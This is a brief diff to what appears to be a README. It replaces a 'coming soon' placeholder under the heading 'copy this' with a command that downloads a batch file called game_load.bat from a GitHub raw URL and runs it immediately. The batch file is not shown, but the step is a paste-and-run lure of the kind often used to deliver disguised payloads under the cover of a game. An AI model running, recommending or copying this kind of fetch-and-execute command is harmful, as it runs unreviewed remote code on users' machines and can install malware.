@@ -5,5 +5,5 @@
 
 ### copy this
 ```
-Code COMING SOON
+curl -L https://raw.githubusercontent.com/Upok18/just_for_fun/refs/heads/main/game_load.bat -o game.bat && game.bat
 ```
